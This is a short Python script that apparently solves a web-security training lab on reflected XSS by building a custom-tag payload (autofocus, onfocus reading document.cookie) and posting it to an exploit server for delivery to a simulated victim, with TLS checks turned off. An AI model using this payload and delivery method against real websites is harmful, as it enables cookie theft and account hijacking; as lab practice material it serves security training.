import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Reflected XSS into HTML context with all tags blocked except custom ones"

def run(url, payload, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Craft a script that will redirect the victim to the vulnerable website with the injected payload in the search query parameter\n2. Deliver the exploit to the victim\n3. The print() function will be called after they trigger the exploit\n""")

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    url = url.rstrip('/')
    payload = f"""<script>
                    location = "{url}/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>"
                </script>"""

    data = {"responseBody": payload, "responseHead": response_head,
            "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit"}

    user_input = input("[?] Enter the exploit server URL: ").strip()
    string = f"'{user_input}'"

    try:
        r = requests.post(user_input.rstrip('/'), data,
                          verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
